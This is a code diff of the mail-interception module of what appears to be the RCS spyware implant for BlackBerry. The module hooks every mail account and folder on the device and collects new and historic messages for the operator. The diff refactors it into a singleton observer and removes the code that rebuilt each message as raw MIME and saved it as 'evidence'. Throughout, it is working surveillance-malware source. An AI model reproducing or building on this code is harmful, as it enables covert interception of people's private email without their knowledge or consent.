@@ -1,18 +1,21 @@
 //#preprocess
+
+/* *************************************************
+ * Copyright (c) 2010 - 2011
+ * HT srl,   All rights reserved.
+ * 
+ * Project      : RCS, RCSBlackBerry
+ * *************************************************/
+	
 /**
  * 
  */
 package blackberry.agent.mail;
 
-import java.io.ByteArrayOutputStream;
-import java.io.IOException;
 import java.util.Date;
-import java.util.Enumeration;
-import java.util.Random;
 
 import net.rim.blackberry.api.mail.Address;
 import net.rim.blackberry.api.mail.Folder;
-import net.rim.blackberry.api.mail.Header;
 import net.rim.blackberry.api.mail.Message;
 import net.rim.blackberry.api.mail.MessagingException;
 import net.rim.blackberry.api.mail.SendListener;
@@ -22,21 +25,16 @@ import net.rim.blackberry.api.mail.Store;
 import net.rim.blackberry.api.mail.event.FolderEvent;
 import net.rim.blackberry.api.mail.event.FolderListener;
 import net.rim.blackberry.api.mail.event.StoreEvent;
-import net.rim.blackberry.api.mail.event.StoreListener;
 import net.rim.device.api.servicebook.ServiceBook;
 import net.rim.device.api.servicebook.ServiceRecord;
-import net.rim.device.api.util.DataBuffer;
+import net.rim.device.api.system.RuntimeStore;
 import net.rim.device.api.util.IntHashtable;
 import blackberry.agent.MessageAgent;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
-import blackberry.evidence.EvidenceType;
-import blackberry.fs.AutoFlashFile;
-import blackberry.fs.Path;
+import blackberry.interfaces.MailObserver;
 import blackberry.utils.Check;
-import blackberry.utils.DateTime;
 
-// TODO: Auto-generated Javadoc
 /**
  * The listener interface for receiving mail events. The class that is
  * interested in processing a mail event implements this interface, and the
@@ -53,9 +51,6 @@ public final class MailListener implements FolderListener, SendListener { //, St
     static Debug debug = new Debug("MailListener", DebugLevel.VERBOSE);
     //#endif
 
-    private static final int MAIL_VERSION = 2009070301;
-
-    MessageAgent messageAgent;
     String[] names;
     private boolean collecting;
 
@@ -64,16 +59,57 @@ public final class MailListener implements FolderListener, SendListener { //, St
     private Filter realtimeFilter;
     private Filter collectFilter;
 
-    Random random = new Random();
+    //Vector mailObservers = new Vector();
+    MailObserver mailObserver;
+    private boolean isRunning;
 
-    /**
-     * Instantiates a new mail listener.
-     * 
-     * @param messageAgent_
-     *            the message agent_
-     */
-    public MailListener(final MessageAgent messageAgent_) {
-        messageAgent = messageAgent_;
+    private static MailListener instance;
+    private static final long GUID = 0xc997041f3236870dL;
+
+    private void MailListener() {
+
+    }
+
+    public static synchronized MailListener getInstance() {
+        if (instance == null) {
+            instance = (MailListener) RuntimeStore.getRuntimeStore().get(GUID);
+            if (instance == null) {
+                final MailListener singleton = new MailListener();
+
+                RuntimeStore.getRuntimeStore().put(GUID, singleton);
+                instance = singleton;
+            }
+        }
+        return instance;
+    }
+
+    public synchronized void addSingleMailObserver(final MailObserver observer) {
+        //#ifdef DEBUG
+        debug.trace("addMailObserver");
+        //#endif
+        mailObserver = observer;
+
+        if (!isRunning()) {
+            //#ifdef DEBUG
+            debug.trace("addMailObserver, not running, so start");
+            //#endif
+            start();
+        }
+    }
+
+    public synchronized void removeSingleMailObserver(
+            final MailObserver observer) {
+        //#ifdef DEBUG
+        debug.trace("removeMailObserver");
+        //#endif
+        mailObserver = null;
+
+        if (isRunning()) {
+            //#ifdef DEBUG
+            debug.trace("removeSingleMailObserver,  running, so stop");
+            //#endif
+            stop();
+        }
     }
 
     private void addListeners(final Store store) {
@@ -96,6 +132,10 @@ public final class MailListener implements FolderListener, SendListener { //, St
         debug.info("batchOperation: " + arg0);
         //#endif
 
+    }
+
+    public synchronized boolean isRunning() {
+        return isRunning;
     }
 
     /*
@@ -129,13 +169,11 @@ public final class MailListener implements FolderListener, SendListener { //, St
             // realtime non guarda il lastcheck, li prende tutti.
             final int filtered = realtimeFilter.filterMessage(message, 0);
             if (filtered == Filter.FILTERED_OK) {
-                final boolean ret = saveEvidence(message,
-                        realtimeFilter.maxMessageSize, "local");
+                dispatch(message, realtimeFilter.maxMessageSize, "local");
                 //#ifdef DEBUG
-                if (ret) {
-                    debug.trace("messagesAdded: "
-                            + message.getFolder().getName());
-                }
+
+                debug.trace("messagesAdded: " + message.getFolder().getName());
+
                 //#endif
             } else {
                 //#ifdef DEBUG
@@ -144,8 +182,8 @@ public final class MailListener implements FolderListener, SendListener { //, St
             }
 
             if (!collecting) {
-                messageAgent.lastcheckSet("COLLECT", new Date());
-                messageAgent.lastcheckSet(folderName, new Date());
+                MessageAgent.getInstance().lastcheckSet("COLLECT", new Date());
+                MessageAgent.getInstance().lastcheckSet(folderName, new Date());
             }
 
         } catch (final MessagingException ex) {
@@ -153,6 +191,11 @@ public final class MailListener implements FolderListener, SendListener { //, St
             debug.error("cannot manage added message: " + ex);
             //#endif
         }
+    }
+
+    private synchronized void dispatch(Message message, int maxMessageSize,
+            String string) {
+        mailObserver.onNewMail(message, maxMessageSize, string);
     }
 
     /*
@@ -188,7 +231,7 @@ public final class MailListener implements FolderListener, SendListener { //, St
     /**
      * Run.
      */
-    public void run() {
+    public void retrieveHistoricMails() {
         //final long timestamp = messageAgent.initMarkup();  
         //#ifdef DEBUG
         debug.init();
@@ -196,7 +239,7 @@ public final class MailListener implements FolderListener, SendListener { //, St
 
         collecting = true;
         // questa data rappresenta l'ultimo controllo effettuato.
-        final Date lastCheckDate = messageAgent.lastcheckGet("COLLECT");
+        final Date lastCheckDate = MessageAgent.getInstance().lastcheckGet("COLLECT");
 
         // Controllo tutti gli account di posta
         for (int count = mailServiceRecords.length - 1; count >= 0; --count) {
@@ -205,7 +248,7 @@ public final class MailListener implements FolderListener, SendListener { //, St
             debug.trace("Email account name: " + names[count]);
             //#endif
 
-            Date lastCheckDateName = messageAgent.lastcheckGet(names[count]);
+            Date lastCheckDateName = MessageAgent.getInstance().lastcheckGet(names[count]);
 
             //names[count] = mailServiceRecords[0].getName();
             final ServiceConfiguration sc = new ServiceConfiguration(
@@ -216,85 +259,17 @@ public final class MailListener implements FolderListener, SendListener { //, St
             // Scandisco ogni Folder dell'account di posta
             scanFolders(names[count], folders, lastCheckDateName);
 
-            messageAgent.lastcheckSet(names[count], new Date());
+            MessageAgent.getInstance().lastcheckSet(names[count], new Date());
         }
 
         // al termine degli scanfolder
-        messageAgent.lastcheckSet("COLLECT", new Date());
+        MessageAgent.getInstance().lastcheckSet("COLLECT", new Date());
 
         //#ifdef DEBUG
         debug.trace("End search");
         //#endif
 
         collecting = false;
-
-    }
-
-    protected synchronized boolean saveEvidence(final Message message,
-            final int maxMessageSize, final String storeName) {
-
-        //#ifdef DBC
-        Check.requires(message != null, "message != null");
-        Check.requires(storeName != null, "storeName != null");
-        //#endif
-
-        //#ifdef DEBUG
-        debug.trace("saveEvidence: " + message + " name: " + storeName);
-        //#endif
-
-        try {
-
-            final int flags = 1;
-
-            String from = "local";
-            if (storeName.indexOf("@") > 0) {
-                from = storeName;
-            }
-            final String mail = makeMimeMessage(message, maxMessageSize, from);
-            //#ifdef DBC
-            Check.asserts(mail != null, "Null mail");
-            //#endif
-
-            int size = message.getSize();
-            if (size == -1) {
-                size = mail.length();
-            }
-
-            final DateTime filetime = new DateTime(message.getReceivedDate());
-
-            final byte[] additionalData = new byte[20];
-
-            final DataBuffer databuffer = new DataBuffer(additionalData, 0, 20,
-                    false);
-            databuffer.writeInt(MAIL_VERSION);
-            databuffer.writeInt(flags);
-            databuffer.writeInt(size);
-            databuffer.writeLong(filetime.getFiledate());
-            //#ifdef DBC
-            Check.asserts(additionalData.length == 20,
-                    "Mail Wrong buffer size: " + additionalData.length);
-            //#endif
-
-            //#ifdef DEBUG
-            debug.trace("saveEvidence: "
-                    + mail.substring(0, Math.min(mail.length(), 200)));
-            //#endif
-
-            messageAgent.createEvidence(additionalData, mail.getBytes("UTF-8"),
-                    EvidenceType.MAIL_RAW);
-
-            //messageAgent.createLog(additionalData, mail.getBytes("ISO-8859-1"),
-            //		LogType.MAIL_RAW);
-
-        } catch (final Exception ex) {
-            //#ifdef DEBUG
-            debug.error("saveEvidence message: " + ex);
-            //#endif
-            return false;
-
-        }
-
-        return true;
     }
 
     /**
@@ -317,13 +292,13 @@ public final class MailListener implements FolderListener, SendListener { //, St
 
         if (collectFilter == null) {
             //#ifdef DEBUG
-            debug.trace("no collectFilter, messageAgent: " + messageAgent);
+            debug.trace("no collectFilter, messageAgent: " + MessageAgent.getInstance());
             //#endif
-            if (messageAgent != null) {
+            if (MessageAgent.getInstance() != null) {
                 //#ifdef DEBUG
                 debug.trace("new collectFilter");
                 //#endif
-                collectFilter = (Filter) messageAgent.filtersEMAIL
+                collectFilter = (Filter) MessageAgent.getInstance().filtersEMAIL
                         .get(Filter.TYPE_COLLECT);
             }
         }
@@ -387,24 +362,24 @@ public final class MailListener implements FolderListener, SendListener { //, St
                         //#endif
 
                         switch (filtered) {
-                        case Filter.FILTERED_OK:
-                            //#ifdef DBC
-                            Check.asserts(storeName != null,
-                                    "scanFolders: storeName != null");
-                            //#endif
+                            case Filter.FILTERED_OK:
+                                //#ifdef DBC
+                                Check.asserts(storeName != null,
+                                        "scanFolders: storeName != null");
+                                //#endif
 
-                            saveEvidence(message, collectFilter.maxMessageSize,
-                                    storeName);
+                                dispatch(message, collectFilter.maxMessageSize,
+                                        storeName);
 
-                            break;
-                        case Filter.FILTERED_DISABLED:
-                        case Filter.FILTERED_NOTFOUND:
-                            updateMarker = false; //fallthrough, inibisce l'updateLastCheck
-           
-                        case Filter.FILTERED_LASTCHECK:
-                        case Filter.FILTERED_DATEFROM:
-                            next = true;
-                            break;
+                                break;
+                            case Filter.FILTERED_DISABLED:
+                            case Filter.FILTERED_NOTFOUND:
+                                updateMarker = false; //fallthrough, inibisce l'updateLastCheck
+
+                            case Filter.FILTERED_LASTCHECK:
+                            case Filter.FILTERED_DATEFROM:
+                                next = true;
+                                break;
                         }
 
                         //#ifdef DBC
@@ -527,9 +502,7 @@ public final class MailListener implements FolderListener, SendListener { //, St
                                     debug.trace("probably PIN Message To: "
                                             + name);
                                     debug.trace("  s: " + message.getSubject());
-                                    debug
-                                            .trace("  b: "
-                                                    + message.getBodyText());
+                                    debug.trace("  b: " + message.getBodyText());
                                     //#endif
                                 }
                             }
@@ -560,150 +533,9 @@ public final class MailListener implements FolderListener, SendListener { //, St
         debug.init();
         debug.trace("sending: " + message.getBodyText());
         //#endif
-        //TODO: enable only if actually needed
+
         return true;
 
-        /*
-         * if (collecting) { //#ifdef DEBUG
-         * debug.trace("sendMessage: ignoring, still collecting"); //#endif
-         * return true; } try { final int filtered =
-         * realtimeFilter.filterMessage(message, messageAgent.lastcheck); if
-         * (filtered == Filter.FILTERED_OK) { //TODO: enable saveLog, only if
-         * needed saveLog(message, realtimeFilter.maxMessageSize, "local");
-         * //#ifdef DEBUG
-         * message.getFolder().getName()); //#endif } } catch (final
-         * MessagingException ex) { //#ifdef DEBUG
-         * debug.error("cannot manage send message: " + ex); //#endif return
-         * true; } messageAgent.updateMarkup(); return true;
-         */
-    }
-
-    private String makeMimeMessage(final Message message,
-            final int maxMessageSize, final String from) {
-        final Address[] addresses;
-
-        final StringBuffer mailRaw = new StringBuffer();
-
-        // costruisce gli header
-        addAllHeaders(message.getAllHeaders(), mailRaw);
-        addFromHeaders(message.getAllHeaders(), mailRaw, from);
-
-        // decode del mime, separo text da html
-        final MailParser parser = new MailParser(message);
-        final Mail mail = parser.parse();
-
-        //#ifdef DEBUG
-        debug.trace("Email size: " + message.getSize() + " bytes");
-        debug.trace("Sent date: " + message.getSentDate());
-        debug.trace("Subject: " + message.getSubject());
-        //debug.trace("Body text: " + message.getBodyText());
-        //#endif
-
-        // comincia la ricostruzione del MIME
-        mailRaw.append("MIME-Version: 1.0\r\n");
-        final long rnd = Math.abs(random.nextLong());
-        final String boundary = "------_=_NextPart_" + rnd;
-
-        if (mail.isMultipart()) {
-            mailRaw.append("Content-Type: multipart/alternative; boundary="
-                    + boundary + "\r\n");
-            mailRaw.append("\r\n--" + boundary + "\r\n");
-        }
-
-        if (mail.hasText()) {
-            mailRaw.append(mail.plainTextMessageContentType);
-            String msg = mail.plainTextMessage;
-            if (maxMessageSize > 0 && msg.length() > maxMessageSize) {
-                msg = msg.substring(0, maxMessageSize);
-            }
-            mailRaw.append(msg);
-        }
-
-        if (mail.isMultipart()) {
-            mailRaw.append("\r\n--" + boundary + "\r\n");
-        }
-
-        if (mail.hasHtml()) {
-            //mailRaw.append("Content-Transfer-Encoding: quoted-printable\r\n");
-            //mailRaw.append("Content-type: text/html; charset=UTF8\r\n\r\n");
-            mailRaw.append(mail.htmlMessageContentType);
-            mailRaw.append(mail.htmlMessage);
-        }
-
-        if (mail.isMultipart()) {
-            mailRaw.append("\r\n--" + boundary + "--\r\n");
-        }
-
-        // se il mio parser fallisce, uso la decodifica di base fornita dalla classe Message
-        if (mail.isEmpty()) {
-            mailRaw.append("Content-type: text/plain; charset=UTF8\r\n\r\n");
-
-            String msg = message.getBodyText();
-            if (maxMessageSize > 0 && msg.length() > maxMessageSize) {
-                msg = msg.substring(0, maxMessageSize);
-            }
-            mailRaw.append(msg);
-        }
-
-        mailRaw.append("\r\n");
-
-        final String craftedMail = mailRaw.toString();
-
-        return craftedMail;
-    }
-
-    /**
-     * Aggiunge alla mail "raw" generata la lista di header presenti nel Message
-     * originale
-     * 
-     * @param headers
-     * @param mail
-     */
-    private void addAllHeaders(final Enumeration headers,
-            final StringBuffer mail) {
-
-        while (headers.hasMoreElements()) {
-            final Object headerObj = headers.nextElement();
-            if (headerObj instanceof Header) {
-                final Header header = (Header) headerObj;
-                mail.append(header.getName());
-                mail.append(header.getValue());
-                mail.append("\r\n");
-            } else {
-                //#ifdef DEBUG
-                debug.error("Unknown header type: " + headerObj);
-                //#endif
-            }
-        }
-    }
-
-    /**
-     * Il metodo addAllHeaders non estrae il campo from. Occorre specificarglelo
-     * esplicitamente.
-     * 
-     * @param headers
-     * @param mail
-     * @param from
-     */
-    private void addFromHeaders(final Enumeration headers,
-            final StringBuffer mail, final String from) {
-
-        boolean fromFound = false;
-        while (headers.hasMoreElements()) {
-            final Object headerObj = headers.nextElement();
-            if (headerObj instanceof Header) {
-                final Header header = (Header) headerObj;
-                if (header.getName().startsWith("From")) {
-                    fromFound = true;
-                }
-            }
-        }
-        if (!fromFound) {
-            //#ifdef DEBUG
-            debug.info("Adding from: " + from);
-            //#endif
-            mail.append("From: " + from + "\r\n");
-        }
     }
 
     /**
@@ -721,11 +553,11 @@ public final class MailListener implements FolderListener, SendListener { //, St
         //#endif
 
         // to forever
-        realtimeFilter = (Filter) messageAgent.filtersEMAIL
+        realtimeFilter = (Filter) MessageAgent.getInstance().filtersEMAIL
                 .get(Filter.TYPE_REALTIME);
 
         // history
-        collectFilter = (Filter) messageAgent.filtersEMAIL
+        collectFilter = (Filter) MessageAgent.getInstance().filtersEMAIL
                 .get(Filter.TYPE_COLLECT);
 
         // Controllo tutti gli account di posta
@@ -743,9 +575,12 @@ public final class MailListener implements FolderListener, SendListener { //, St
             }
         }
 
+        isRunning = true;
+
         //#ifdef DEBUG
         debug.trace("Started");
         //#endif
+
     }
 
     /**
@@ -764,6 +599,8 @@ public final class MailListener implements FolderListener, SendListener { //, St
                 removeListeners(store);
             }
         }
+
+        isRunning = false;
         //#ifdef DEBUG
         debug.trace("Stopped");
         //#endif
